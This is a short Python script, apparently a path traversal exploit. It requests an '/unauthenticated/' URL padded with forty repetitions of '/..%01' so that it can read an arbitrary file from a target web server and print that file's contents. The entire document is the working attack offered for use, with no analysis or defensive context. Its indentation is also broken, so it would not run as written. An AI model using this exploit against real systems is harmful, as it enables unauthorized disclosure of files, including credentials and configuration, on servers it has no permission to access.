#!/usr/bin/python
import time, struct, sys
import requests

try:
server = sys.argv[1]
port = sys.argv[2]
file = sys.argv[3]
except IndexError:
print "[+] Usage %s host port" % sys.argv[0]
sys.exit()

req = "/..%01" * 40
r = requests.get('http://'+ server+':'+port+'/unauthenticated/'+req+ file)
try:
r
print (r.content)

except:
print "[!] Please, try again my lord"

r.close()
